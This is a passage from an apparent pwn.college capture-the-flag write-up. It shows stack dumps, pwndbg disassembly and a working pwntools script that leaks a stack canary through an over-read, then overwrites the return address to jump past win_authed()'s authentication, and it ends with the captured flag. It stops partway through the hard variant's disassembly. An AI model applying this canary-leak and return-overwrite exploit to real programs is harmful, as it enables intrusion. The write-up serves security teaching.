| 0x00007ffca8e196b0 (rsp+0x01b0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffca8e196b8 (rsp+0x01b8) | 51 29 25 b6 eb 7b 00 00 | 0x00007bebb6252951 |
| 0x00007ffca8e196c0 (rsp+0x01c0) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffca8e196c8 (rsp+0x01c8) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007ffca8e196d0 (rsp+0x01d0) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
| 0x00007ffca8e196d8 (rsp+0x01d8) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
| 0x00007ffca8e196e0 (rsp+0x01e0) | 40 55 3b b6 eb 7b 00 00 | 0x00007bebb63b5540 |
| 0x00007ffca8e196e8 (rsp+0x01e8) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e196f0 (rsp+0x01f0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffca8e196f8 (rsp+0x01f8) | 93 2e 25 b6 eb 7b 00 00 | 0x00007bebb6252e93 |
| 0x00007ffca8e19700 (rsp+0x0200) | a0 f6 3a b6 eb 7b 00 00 | 0x00007bebb63af6a0 |
| 0x00007ffca8e19708 (rsp+0x0208) | 0a 00 00 00 00 00 00 00 | 0x000000000000000a |
| 0x00007ffca8e19710 (rsp+0x0210) | 20 90 c3 0b 92 59 00 00 | 0x000059920bc39020 |
| 0x00007ffca8e19718 (rsp+0x0218) | 02 83 24 b6 eb 7b 00 00 | 0x00007bebb6248302 |
| 0x00007ffca8e19720 (rsp+0x0220) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
| 0x00007ffca8e19728 (rsp+0x0228) | 60 58 c3 0b 92 59 00 00 | 0x000059920bc35860 |
| 0x00007ffca8e19730 (rsp+0x0230) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
| 0x00007ffca8e19738 (rsp+0x0238) | 00 a3 23 87 ea 62 c0 b5 | 0xb5c062ea8723a300 |
| 0x00007ffca8e19740 (rsp+0x0240) | 80 a7 e1 a8 fc 7f 00 00 | 0x00007ffca8e1a780 |
| 0x00007ffca8e19748 (rsp+0x0248) | 30 58 c3 0b 92 59 00 00 | 0x000059920bc35830 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffca8e19540
- the saved frame pointer (of main) is at 0x7ffca8e19740
- the saved return address (previously to main) is at 0x7ffca8e19748
- the saved return address is now pointing to 0x59920bc35830.
- the canary is stored at 0x7ffca8e19738.
- the canary value is now 0xb5c062ea8723a300.
- the address of win_authed() is 0x59920bc34e27.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

You said: aa
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!
Goodbye!
### Goodbye!
```

Since the program did not clean up the stack, we can see the canary of the previous function is the same as the current one: `0xb5c062ea8723a300`.
If we manage to leak this canary using a buffer over-read, we can pass it in place of the canary of the current function.

We need the following: 
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Offset of instruction within `win_authed()` which skips the authentication

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001110  __cxa_finalize@plt
0x0000000000001120  putchar@plt
0x0000000000001130  __errno_location@plt
0x0000000000001140  puts@plt
0x0000000000001150  write@plt
0x0000000000001160  __stack_chk_fail@plt
0x0000000000001170  printf@plt
0x0000000000001180  geteuid@plt
0x0000000000001190  read@plt
0x00000000000011a0  setvbuf@plt
0x00000000000011b0  open@plt
0x00000000000011c0  __isoc99_scanf@plt
0x00000000000011d0  exit@plt
0x00000000000011e0  strerror@plt
0x00000000000011f0  strstr@plt
0x0000000000001200  _start
0x0000000000001230  deregister_tm_clones
0x0000000000001260  register_tm_clones
0x00000000000012a0  __do_global_dtors_aux
0x00000000000012e0  frame_dummy
0x00000000000012e9  DUMP_STACK
0x00000000000014ec  bin_padding
0x0000000000001e27  win_authed
0x0000000000001f44  challenge
0x000000000000275b  main
0x0000000000002860  __libc_csu_init
0x00000000000028d0  __libc_csu_fini
0x00000000000028d8  _fini
```

#### `win_authed()`

```
pwndbg> disassemble win_authed 
Dump of assembler code for function win_authed:
   0x0000000000001e27 <+0>:     endbr64
   0x0000000000001e2b <+4>:     push   rbp
   0x0000000000001e2c <+5>:     mov    rbp,rsp
   0x0000000000001e2f <+8>:     sub    rsp,0x10
   0x0000000000001e33 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000001e36 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000001e3d <+22>:    jne    0x1f41 <win_authed+282>
   0x0000000000001e43 <+28>:    lea    rdi,[rip+0x12a6]        # 0x30f0

# ---- snip ----

   0x0000000000001f41 <+282>:   nop
   0x0000000000001f42 <+283>:   leave
   0x0000000000001f43 <+284>:   ret
End of assembler dump.
```

We need the following: 
- [ ] Expected substring in order to loop the `challenge()` function
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1e43`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# ---- snip ----

   0x00000000000024c3 <+1407>:  mov    rdx,QWORD PTR [rbp-0x210]
   0x00000000000024ca <+1414>:  mov    rax,QWORD PTR [rbp-0x208]
   0x00000000000024d1 <+1421>:  mov    rsi,rax
   0x00000000000024d4 <+1424>:  mov    edi,0x0
   0x00000000000024d9 <+1429>:  call   0x1190 <read@plt>

# ---- snip ----

   0x00000000000026e8 <+1956>:  call   0x1140 <puts@plt>
   0x00000000000026ed <+1961>:  mov    rax,QWORD PTR [rbp-0x208]
   0x00000000000026f4 <+1968>:  lea    rsi,[rip+0x1ef6]        # 0x45f1
   0x00000000000026fb <+1975>:  mov    rdi,rax
   0x00000000000026fe <+1978>:  call   0x11f0 <strstr@plt>
   0x0000000000002703 <+1983>:  test   rax,rax
   0x0000000000002706 <+1986>:  je     0x2734 <challenge+2032>
   0x0000000000002708 <+1988>:  lea    rdi,[rip+0x1ee9]        # 0x45f8
   0x000000000000270f <+1995>:  call   0x1140 <puts@plt>
   0x0000000000002714 <+2000>:  mov    rdx,QWORD PTR [rbp-0x238]
   0x000000000000271b <+2007>:  mov    rcx,QWORD PTR [rbp-0x230]
   0x0000000000002722 <+2014>:  mov    eax,DWORD PTR [rbp-0x224]
   0x0000000000002728 <+2020>:  mov    rsi,rcx
   0x000000000000272b <+2023>:  mov    edi,eax
   0x000000000000272d <+2025>:  call   0x1f44 <challenge>
   0x0000000000002732 <+2030>:  jmp    0x2745 <challenge+2049>
   0x0000000000002734 <+2032>:  lea    rdi,[rip+0x1ee7]        # 0x4622
   0x000000000000273b <+2039>:  call   0x1140 <puts@plt>
   0x0000000000002740 <+2044>:  mov    eax,0x0
   0x0000000000002745 <+2049>:  mov    rcx,QWORD PTR [rbp-0x8]
   0x0000000000002749 <+2053>:  xor    rcx,QWORD PTR fs:0x28
   0x0000000000002752 <+2062>:  je     0x2759 <challenge+2069>
   0x0000000000002754 <+2064>:  call   0x1160 <__stack_chk_fail@plt>
   0x0000000000002759 <+2069>:  leave
   0x000000000000275a <+2070>:  ret
End of assembler dump.
```

The challenge calls `strstr@plt` in order to find a substring `needle` within the string `haystack`. The string address is stored at `rbp-0x208` which is where our buffer is stored as well. So it looks for some substring within our string.

Then if it finds the substring, it calls itself again at `challenge+2025`. Otherwise it exits.

Let's see what substring it expects, because if we successfully pass it, we will get the canary value and also another chance to send the actual payload.

```
pwndbg> break *(challenge+1978)
Breakpoint 1 at 0x26fe
```

```
pwndbg> run
Starting program: /challenge/latent-leak-easy 

# ---- snip ----

Payload size: 2

# ---- snip ----

Send your payload (up to 2 bytes)!
aa

# ---- snip ----

You said: aa
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!

Breakpoint 1, 0x00006340b0a7b6fe in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
 RBX  0x6340b0a7b860 (__libc_csu_init) ◂— endbr64 
 RCX  0x7898fe048297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0
 RDI  0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
 RSI  0x6340b0a7d5f1 ◂— 0x4200544145504552 /* 'REPEAT' */
 R8   0x21
 R9   0xd
 R10  0x6340b0a7d55f ◂— 0xa /* '\n' */
 R11  0x246
 R12  0x6340b0a7a200 (_start) ◂— endbr64 
 R13  0x7fff7aeced90 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff7aecdc60 —▸ 0x7fff7aececa0 ◂— 0
 RSP  0x7fff7aecda20 ◂— 0
 RIP  0x6340b0a7b6fe (challenge+1978) ◂— call strstr@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x6340b0a7b6fe <challenge+1978>    call   strstr@plt                  <strstr@plt>
        haystack: 0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
        needle: 0x6340b0a7d5f1 ◂— 0x4200544145504552 /* 'REPEAT' */
 
   0x6340b0a7b703 <challenge+1983>    test   rax, rax
   0x6340b0a7b706 <challenge+1986>    je     challenge+2032              <challenge+2032>
 
   0x6340b0a7b708 <challenge+1988>    lea    rdi, [rip + 0x1ee9]     RDI => 0x6340b0a7d5f8 ◂— 'Backdoor triggered! Repeating challenge()'
   0x6340b0a7b70f <challenge+1995>    call   puts@plt                    <puts@plt>
 
   0x6340b0a7b714 <challenge+2000>    mov    rdx, qword ptr [rbp - 0x238]
   0x6340b0a7b71b <challenge+2007>    mov    rcx, qword ptr [rbp - 0x230]
   0x6340b0a7b722 <challenge+2014>    mov    eax, dword ptr [rbp - 0x224]
   0x6340b0a7b728 <challenge+2020>    mov    rsi, rcx
   0x6340b0a7b72b <challenge+2023>    mov    edi, eax
   0x6340b0a7b72d <challenge+2025>    call   challenge                   <challenge>
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp 0x7fff7aecda20 ◂— 0
01:0008│-238 0x7fff7aecda28 —▸ 0x7fff7aeceda8 —▸ 0x7fff7aecf69c ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-230 0x7fff7aecda30 —▸ 0x7fff7aeced98 —▸ 0x7fff7aecf680 ◂— '/challenge/latent-leak-easy'
03:0018│-228 0x7fff7aecda38 ◂— 0x100000000
04:0020│-220 0x7fff7aecda40 ◂— 0
05:0028│-218 0x7fff7aecda48 ◂— 0x200000000
06:0030│-210 0x7fff7aecda50 ◂— 2
07:0038│-208 0x7fff7aecda58 —▸ 0x7fff7aecda60 ◂— 0x6161 /* 'aa' */
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x6340b0a7b6fe challenge+1978
   1   0x6340b0a7b830 main+213
   2   0x7898fdf5e083 __libc_start_main+243
   3   0x6340b0a7a22e _start+46
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Expected substring in order to loop the `challenge()` function: `REPEAT`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1e43`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'
context.log_level = 'error'

# Initialize data
buffer_addr = 0x7ffca8e19540
prev_func_canary_addr = 0x7ffca8e19628
curr_func_canary_addr = 0x7ffca8e19738
addr_of_saved_ip = 0x7ffca8e19748
safe_win_auth_offset = 0x1e43

attempt = 0

while True:
    attempt += 1
    p = process('/challenge/latent-leak-easy')
    
    try:
        # Standard offsets for this challenge level
        # If your previous leak was 24, try 24, but let's verify the output
        offset_to_prev_func_canary = prev_func_canary_addr - buffer_addr               # Distance from start of buffer to the canary
        payload_size = offset_to_prev_func_canary + 1

        # --- STAGE 1: LEAK ---
        p.recvuntil(b'Payload size: ')
        p.sendline(str(payload_size).encode())

        payload = b'REPEAT'
        payload += b'A' * (offset_to_prev_func_canary - 6)
        payload += b'B' 

        p.recvuntil(b'bytes)!')
        p.send(payload)

        # Grab the leak
        p.recvuntil(b'AAAAAB')
        canary_raw = p.recv(7)
        canary = u64(canary_raw.rjust(8, b'\x00'))

        # --- STAGE 2: EXPLOIT ---
        offset_to_prev_func_canary = curr_func_canary_addr - buffer_addr 
        offset_to_ret = addr_of_saved_ip - (curr_func_canary_addr + 8)         # Distance from canary to the return address (usually 16 bytes: 8 for canary + 8 for RBP) 

        p.recvuntil(b'Payload size: ')
        
        # Build payload: [Padding] + [Canary] + [RBP Padding] + [RIP Partial]
        exploit = b"A" * offset_to_prev_func_canary
        exploit += p64(canary)
        exploit += b"B" * offset_to_ret
        exploit += struct.pack("<H", safe_win_auth_offset)

        p.sendline(str(len(exploit)).encode())
        p.recvuntil(b'bytes)!')
        p.send(exploit)

        # Increase timeout slightly to allow the flag to print
        output = p.recvall(timeout=1).decode(errors="ignore")
        
        if "pwn.college{" in output:
            print(f"!!! FLAG FOUND ON ATTEMPT {attempt} !!!")
            print(output)
            break

    except EOFError:
        pass
    finally:
        p.close()
```

```
hacker@program-security~latent-leak-easy:/$ python ~/script.py 
!!! FLAG FOUND ON ATTEMPT 1 !!!

You sent 522 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe0a2685f0 (rsp+0x0000) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0a2685f8 (rsp+0x0008) | c8 9b 26 0a fe 7f 00 00 | 0x00007ffe0a269bc8 |
| 0x00007ffe0a268600 (rsp+0x0010) | b8 9b 26 0a fe 7f 00 00 | 0x00007ffe0a269bb8 |
| 0x00007ffe0a268608 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe0a268610 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe0a268618 (rsp+0x0028) | 00 00 00 00 0a 02 00 00 | 0x0000020a00000000 |
| 0x00007ffe0a268620 (rsp+0x0030) | 0a 02 00 00 00 00 00 00 | 0x000000000000020a |
| 0x00007ffe0a268628 (rsp+0x0038) | 30 86 26 0a fe 7f 00 00 | 0x00007ffe0a268630 |
| 0x00007ffe0a268630 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268638 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268640 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268648 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268650 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268658 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268660 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268668 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268670 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268678 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268680 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268688 (rsp+0x0098) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268690 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268698 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686a0 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686a8 (rsp+0x00b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686b0 (rsp+0x00c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686b8 (rsp+0x00c8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686c0 (rsp+0x00d0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686c8 (rsp+0x00d8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686d0 (rsp+0x00e0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686d8 (rsp+0x00e8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686e0 (rsp+0x00f0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686e8 (rsp+0x00f8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686f0 (rsp+0x0100) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2686f8 (rsp+0x0108) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268700 (rsp+0x0110) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268708 (rsp+0x0118) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268710 (rsp+0x0120) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268718 (rsp+0x0128) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268720 (rsp+0x0130) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268728 (rsp+0x0138) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268730 (rsp+0x0140) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268738 (rsp+0x0148) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268740 (rsp+0x0150) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268748 (rsp+0x0158) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268750 (rsp+0x0160) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268758 (rsp+0x0168) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268760 (rsp+0x0170) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268768 (rsp+0x0178) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268770 (rsp+0x0180) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268778 (rsp+0x0188) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268780 (rsp+0x0190) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268788 (rsp+0x0198) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268790 (rsp+0x01a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268798 (rsp+0x01a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687a0 (rsp+0x01b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687a8 (rsp+0x01b8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687b0 (rsp+0x01c0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687b8 (rsp+0x01c8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687c0 (rsp+0x01d0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687c8 (rsp+0x01d8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687d0 (rsp+0x01e0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687d8 (rsp+0x01e8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687e0 (rsp+0x01f0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687e8 (rsp+0x01f8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687f0 (rsp+0x0200) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a2687f8 (rsp+0x0208) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268800 (rsp+0x0210) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268808 (rsp+0x0218) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268810 (rsp+0x0220) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268818 (rsp+0x0228) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268820 (rsp+0x0230) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffe0a268828 (rsp+0x0238) | 00 6d 18 2d 52 75 ac c3 | 0xc3ac75522d186d00 |
| 0x00007ffe0a268830 (rsp+0x0240) | 42 42 42 42 42 42 42 42 | 0x4242424242424242 |
| 0x00007ffe0a268838 (rsp+0x0248) | 43 1e 1e ce f1 5f 00 00 | 0x00005ff1ce1e1e43 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe0a268630
- the saved frame pointer (of main) is at 0x7ffe0a268830
- the saved return address (previously to main) is at 0x7ffe0a268838
- the saved return address is now pointing to 0x5ff1ce1e1e43.
- the canary is stored at 0x7ffe0a268828.
- the canary value is now 0xc3ac75522d186d00.
- the address of win_authed() is 0x5ff1ce1e1e27.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win_authed() when it returns.
Let's try it now!

You said: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
This challenge has a trick hidden in its code. Reverse-engineer the binary right after this puts()
call to see the hidden backdoor!
Goodbye!
You win! Here is your flag:
pwn.college{0kx4a5AU-rY-gckKRBcfAcg_bmK.0VNxMDL4ITM0EzW}
```

&nbsp;

## Latent Lunacy (Hard)

```
hacker@program-security~latent-leak-hard:/$ /challenge/latent-leak-hard 
###
### Welcome to /challenge/latent-leak-hard!
###

Payload size: 2
Send your payload (up to 2 bytes)!
aa
You said: aa
Goodbye!
### Goodbye!
```

We need the following information to craft our exploit:
- [ ] Location of buffer
- [ ] Location of canary of the current function
- [ ] Location of the canary of the previously executed function
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Location of stored return address to `main()`
- [ ] Offset of instruction within `win_authed()` which skips the authentication

### Binary Analysis

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001110  __cxa_finalize@plt
0x0000000000001120  putchar@plt
0x0000000000001130  __errno_location@plt
0x0000000000001140  puts@plt
0x0000000000001150  write@plt
0x0000000000001160  __stack_chk_fail@plt
0x0000000000001170  printf@plt
0x0000000000001180  geteuid@plt
0x0000000000001190  read@plt
0x00000000000011a0  setvbuf@plt
0x00000000000011b0  open@plt
0x00000000000011c0  __isoc99_scanf@plt
0x00000000000011d0  exit@plt
0x00000000000011e0  strerror@plt
0x00000000000011f0  strstr@plt
0x0000000000001200  _start
0x0000000000001230  deregister_tm_clones
0x0000000000001260  register_tm_clones
0x00000000000012a0  __do_global_dtors_aux
0x00000000000012e0  frame_dummy
0x00000000000012e9  bin_padding
0x0000000000001dad  win_authed
0x0000000000001eca  challenge
0x000000000000203b  main
0x0000000000002140  __libc_csu_init
0x00000000000021b0  __libc_csu_fini
0x00000000000021b8  _fini
```

#### `win_authed()`

```
pwndbg> disassemble win_authed 
Dump of assembler code for function win_authed:
   0x0000000000001dad <+0>:     endbr64
   0x0000000000001db1 <+4>:     push   rbp
   0x0000000000001db2 <+5>:     mov    rbp,rsp
   0x0000000000001db5 <+8>:     sub    rsp,0x10
   0x0000000000001db9 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000001dbc <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x0000000000001dc3 <+22>:    jne    0x1ec7 <win_authed+282>
   0x0000000000001dc9 <+28>:    lea    rdi,[rip+0x1238]        # 0x3008

# ---- snip ----

   0x0000000000001ec7 <+282>:   nop
   0x0000000000001ec8 <+283>:   leave
   0x0000000000001ec9 <+284>:   ret
End of assembler dump.
```

- [ ] Location of buffer
- [ ] Location of canary of the current function
- [ ] Location of the canary of the previously executed function
- [ ] Expected substring in order to loop the `challenge()` function
- [ ] Location of stored return address to `main()`
- [x] Offset of instruction within `win_authed()` which skips the authentication: `0x1dc9`

#### `challenge()`

```
pwndbg> disassemble challenge 
Dump of assembler code for function challenge:
   0x0000000000001eca <+0>:     endbr64
   0x0000000000001ece <+4>:     push   rbp
   0x0000000000001ecf <+5>:     mov    rbp,rsp
   0x0000000000001ed2 <+8>:     sub    rsp,0x190
   0x0000000000001ed9 <+15>:    mov    DWORD PTR [rbp-0x174],edi
   0x0000000000001edf <+21>:    mov    QWORD PTR [rbp-0x180],rsi
   0x0000000000001ee6 <+28>:    mov    QWORD PTR [rbp-0x188],rdx
   0x0000000000001eed <+35>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000001ef6 <+44>:    mov    QWORD PTR [rbp-0x8],rax
   0x0000000000001efa <+48>:    xor    eax,eax
   0x0000000000001efc <+50>:    lea    rax,[rbp-0x150]
   0x0000000000001f03 <+57>:    mov    QWORD PTR [rbp-0x158],rax
   0x0000000000001f0a <+64>:    mov    QWORD PTR [rbp-0x160],0x0
   0x0000000000001f15 <+75>:    lea    rdi,[rip+0x11f0]        # 0x310c
   0x0000000000001f1c <+82>:    mov    eax,0x0
   0x0000000000001f21 <+87>:    call   0x1170 <printf@plt>
   0x0000000000001f26 <+92>:    lea    rax,[rbp-0x160]
   0x0000000000001f2d <+99>:    mov    rsi,rax
   0x0000000000001f30 <+102>:   lea    rdi,[rip+0x11e4]        # 0x311b
   0x0000000000001f37 <+109>:   mov    eax,0x0
   0x0000000000001f3c <+114>:   call   0x11c0 <__isoc99_scanf@plt>
   0x0000000000001f41 <+119>:   mov    rax,QWORD PTR [rbp-0x160]
   0x0000000000001f48 <+126>:   mov    rsi,rax
   0x0000000000001f4b <+129>:   lea    rdi,[rip+0x11ce]        # 0x3120
   0x0000000000001f52 <+136>:   mov    eax,0x0
   0x0000000000001f57 <+141>:   call   0x1170 <printf@plt>
   0x0000000000001f5c <+146>:   mov    rdx,QWORD PTR [rbp-0x160]
   0x0000000000001f63 <+153>:   mov    rax,QWORD PTR [rbp-0x158]
   0x0000000000001f6a <+160>:   mov    rsi,rax
   0x0000000000001f6d <+163>:   mov    edi,0x0
   0x0000000000001f72 <+168>:   call   0x1190 <read@plt>
   0x0000000000001f77 <+173>:   mov    DWORD PTR [rbp-0x164],eax
   0x0000000000001f7d <+179>:   cmp    DWORD PTR [rbp-0x164],0x0
   0x0000000000001f84 <+186>:   jns    0x1fb2 <challenge+232>
   0x0000000000001f86 <+188>:   call   0x1130 <__errno_location@plt>
   0x0000000000001f8b <+193>:   mov    eax,DWORD PTR [rax]
   0x0000000000001f8d <+195>:   mov    edi,eax
   0x0000000000001f8f <+197>:   call   0x11e0 <strerror@plt>
   0x0000000000001f94 <+202>:   mov    rsi,rax
   0x0000000000001f97 <+205>:   lea    rdi,[rip+0x11aa]        # 0x3148
   0x0000000000001f9e <+212>:   mov    eax,0x0
   0x0000000000001fa3 <+217>:   call   0x1170 <printf@plt>
   0x0000000000001fa8 <+222>:   mov    edi,0x1
   0x0000000000001fad <+227>:   call   0x11d0 <exit@plt>
   0x0000000000001fb2 <+232>:   mov    rax,QWORD PTR [rbp-0x158]
   0x0000000000001fb9 <+239>:   mov    rsi,rax
   0x0000000000001fbc <+242>:   lea    rdi,[rip+0x11a9]        # 0x316c
